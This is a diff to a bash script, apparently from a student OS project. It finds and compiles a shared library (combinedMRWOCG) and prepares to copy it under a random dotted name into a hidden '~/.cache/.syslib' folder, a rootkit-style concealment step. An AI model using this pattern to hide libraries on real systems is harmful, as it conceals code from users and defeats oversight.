@@ -1,10 +1,17 @@
 #!/bin/bash
 
+# find the files
+SOURCE_SO=$(find ~/ -name combinedMRWOCG.so | grep -m 1 "combinedMRWOCG.so") 
+SOURCE_C=$(find ~/ -name combinedMRWOCG.c | grep -m 1 "combinedMRWOCG.c") 
+
+echo "$SOURCE_C " 
+echo "$SOURCE_SO" 
+
 # Compile the .so from the .c file
-gcc -shared -fPIC -o combinedMRWOCG.so combinedMRWOCG.c -ldl
+gcc -shared -fPIC -o "$SOURCE_SO" "$SOURCE_C" -ldl
 
 # IMPORTANT NOTE: make sure you have your own paths to the code here!!!
-SOURCE_SO="$HOME/Documents/OS_Project/osProject/main/src/test/combinedMRWOCG.so"
+#SOURCE_SO="$HOME/Documents/OS_Project/osProject/main/src/test/combinedMRWOCG.so"
 HIDDEN_DIR="$HOME/.cache/.syslib"
 NEW_NAME=".lib$(head /dev/urandom | tr -dc a-z0-9 | head -c 8).so"
 HIDDEN_SO="$HIDDEN_DIR/$NEW_NAME"
